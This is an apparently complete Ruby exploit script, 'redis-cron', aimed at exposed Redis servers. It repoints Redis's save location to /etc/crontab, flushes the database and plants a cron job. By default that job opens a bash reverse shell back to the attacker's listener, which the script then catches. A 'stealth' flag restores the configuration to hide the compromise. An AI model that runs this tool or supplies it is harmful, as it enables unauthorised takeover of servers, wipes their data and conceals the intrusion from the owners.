#! /usr/bin/ruby

require 'optparse'
require "socket"

#Write banner
puts <<-'EOF'
  _____          _ _        _____ _____   ____  _   _ 
 |  __ \        | (_)      / ____|  __ \ / __ \| \ | |
 | |__) |___  __| |_ ___  | |    | |__) | |  | |  \| |
 |  _  // _ \/ _` | / __| | |    |  _  /| |  | | . ` |
 | | \ \  __/ (_| | \__ \ | |____| | \ \| |__| | |\  |
 |_|  \_\___|\__,_|_|___/  \_____|_|  \_\\____/|_| \_|

By Levitating
https://github.com/LevitatingBusinessMan/redis-cron

Version 0.0.1

EOF

#Reference: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

@opts = {port: "6379", timeout: "1", user: "root"}
OptionParser.new do |parser|
	parser.banner = "Usage: ./redis_ssh.rb [options]"

	parser.on("-h", "--host HOST", "Victim (required)") do |h|
		@opts[:host] = h
	end
	parser.on("-p", "--port PORT", /\d*/, "Port (default: 6379)") do |p|
		@opts[:port] = p
	end
	parser.on("-v", "--[no-]verbose", "Run verbosely") do |v|
		@opts[:verbose] = v
	end
	parser.on("-t", "--timeout TIME", "Time to wait for packets (default: 1)") do |t|
		@opts[:timeout] = t
	end
	parser.on("-s","--lhost LHOST" ,"Address to listen on") do |s|
		@opts[:lhost] = s
	end
	parser.on("-l","--lport LPORT", /\d*/, "Port to listen on") do |lport|
		@opts[:lport] = lport
	end
	parser.on("-i", "--info", "Print info about a redis server") do |i|
		@opts[:info] = i
	end
	parser.on("-e", "--stealth", "Restore configuration to stay hidden") do |e|
		@opts[:stealth] = e
	end
	parser.on("-c", "--command COMMAND", "Command to run on victim (instead of default revshell)") do |c|
		@opts[:command] = c
	end
	parser.on("-r", "--remove", "Remove a previously placed crontab") do |r|
		@opts[:remove] = r
	end
=begin
	parser.on("-u", "--user", "Place a crontab for a different user than root") do |u|
		@opts[:user] = u
	end
=end
	parser.on(nil, "--help", "Print this help") do
        puts parser
        exit
    end
end.parse!

for arg in [:host,:lhost,:lport]
	if !@opts[arg]
		abort "Missing #{arg}! (--help for usage)" if (arg == :lhost or arg == :lport) && !@opts[:command] && !@opts[:remove] && !@opts[:info]
	end
end

@changedConfigDir = @changedConfigFile = false

class Log

	def self.info msg
		print "\e[34m[info]\e[0m "
		p msg
	end

	def self.succ msg
		print "\e[32m[succ]\e[0m "
		p msg
	end

	def self.warn msg
		print "\e[93m[warn]\e[0m "
		p msg
	end

	def self.err msg
		print "\e[31m[err]\e[0m "
		p msg
	end

	def self.req msg
		print "\e[31m[>>]\e[0m "
		p msg
	end
	
	def self.res msg
		print "\e[32m[<<]\e[0m "
		p msg
	end

end

def stealth
	if !@opts[:stealth]
		Log.warn "Not using -e flag, so not cleaning up"
	else
		if @conf_dir
			Log.info "Restoring configuration directory"
			out = send "config set dir #{@conf_dir}"
			Log.res out if @opts[:verbose]
			Log.warn "Failed to change config directory back" if out != "+OK\r\n"
		end

		if @conf_dbfilename
			Log.info "Restoring databasefile"
			out = send "config set dbfilename #{@conf_dbfilename}"
			Log.res out if @opts[:verbose]
			Log.warn "Failed to restore config database filename" if out != "+OK\r\n"
		end

		Log.warn "crontab might still placed at /etc/crontab or be in memory, use '-r' to remove" if !@opts[:remove]
	end
end

#For exit and log oneliners
def error
	yield
	if @changedConfigDir or @changedConfigFile
		if @opts[:stealth]
			stealth
		else
			Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
		end
	end
	exit 1
end

def send msg
	Log.req msg if @opts[:verbose]
	
	out = `exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]} && printf '#{msg}\n' >&5 && timeout #{@opts[:timeout]} cat <&5`
	Log.warn "Received empty response, increasing the timeout may help" if out.empty?
	return out
end

#Check if up
Log.info "Check if port #{@opts[:port]} is open"
# Because the status code isn't 0 when the host doesnt not respond with anything we allow all non 1 exit codes
error {Log.err "#{@opts[:host]}:#{@opts[:port]} not responding"} if
`timeout --preserve-status #{@opts[:timeout]} sh -c 'cat < /dev/tcp/#{@opts[:host]}/#{@opts[:port]}' > /dev/null 2>&1; echo $?` == "1\n"

Log.info "Gathering information about the victim (use -i to see output)"
def infogather
	out = send "info"
	if !out.include? "# Server"
		Log.res @info if @opts[:verbose]
		Log.err "Failed to gather information from the server"
		exit 1
	end
	puts out if @opts[:info]
	@info = {}
	out.split().each do |option|
		if !option.start_with? "#" and option.include? ":"
			@info[option.split(":")[0]] = option.split(":")[1]
		end
	end
end

infogather

if @info["slave_read_only"] == "1"
	error {Log.err "This is a readonly slave and master server is down!"} if @info["master_link_status"] == "down"
	Log.warn "This is a readonly slave! Attempting to switch to master instead!"
	@opts[:host] = @info["master_host"]
	@opts[:port] = @info["master_port"]
	Log.warn "Future packets will be send to #{@opts[:host]}:#{@opts[:port]}"
	Log.warn "Gathering new info"
	infogather
end

if @info["role"] == "slave"
	Log.warn "This server is a slave of #{@info["master_host"]}:#{@info["master_port"]}, it might be better to attack that server instead."
end

Log.info "Config_file: #{@info["config_file"]}"
Log.info "Executable: #{@info["executable"]}"


# Config directory retrieval
out = send "config get dir"
Log.res out if @opts[:verbose]
Log.warn "Unable to read config dir" if !out.start_with?("*2\r\n$3\r\ndir\r\n")

@conf_dir = out.split("\r\n")[4]
Log.info "Config directory: #{@conf_dir}"

# When doing a vuln check dont go further
begin Log.info "Exiting early"; exit 0 end if @opts[:info]

if @opts[:stealth]
	# Config directory retrieval
	Log.info "Getting original database filename"
	out = send "config get dbfilename"
	Log.res out if @opts[:verbose]
	Log.warn "Unable to read database filename" if !out.start_with?("*2\r\n$10\r\ndbfilename\r\n")

	@conf_dbfilename = out.split("\r\n")[4]
end

Log.info "Setting configuration directory"
#out = send "config set dir /var/spool/cron"
out = send "config set dir /etc"
Log.res out if @opts[:verbose]
error {Log.err "Failed to change config directory to /etc (might not exist)"} if out != "+OK\r\n"
@changedConfigDir = true

#new_dbname = @opts[:user]
new_dbname = "crontab"

Log.info "Changing database filename to '#{new_dbname}'"
out = send "config set dbfilename #{new_dbname}"
Log.res out if @opts[:verbose]
error {Log.err "Failed to change config database filename"} if out != "+OK\r\n"
@changedConfigFile = true

Log.info "Attempt to flush database"
out = send "flushall"
Log.res out if @opts[:verbose]
Log.warn "Failed to flush the database" if out != "+OK\r\n"

command = @opts[:command] || "bash -i >& /dev/tcp/#{@opts[:lhost]}/#{@opts[:lport]} 0>&1"
payload = "* * * * * #{command}"

if !@opts[:remove]
	Log.info "Saving value"
	escaped_string = "*3\r\n\$3\r\nset\r\n\$7\r\ncrontab\r\n\$#{payload.length + 4}\r\n#{"\n\n" + payload + "\n\n"}\r\n"
	out = send escaped_string
	Log.res out if @opts[:verbose]
	error {Log.err "Failed to save value on the server"} if out != "+OK\r\n"
end

Log.info "Saving database"
out = send "save"
Log.res out if @opts[:verbose]
error {Log.err "Failed to save database"} if out != "+OK\r\n"

stealth

if !@opts[:command] && !@opts[:remove]
	Log.info "Opening revshell server on #{@opts[:lport]}"
	# Connect-back @server
	server = TCPServer.new @opts[:lport]

	Log.info "Waiting for connect-back (at least 60s)"
	shell = server.accept

	Log.succ "Succesfull connect-back"

	Log.info "Starting (fully upgradeable) shell"

	loop do
		begin
			print shell.read_nonblock(1)
		rescue
		end
		begin
			shell.write STDIN.read_nonblock(1)
		rescue
		end
	end
end
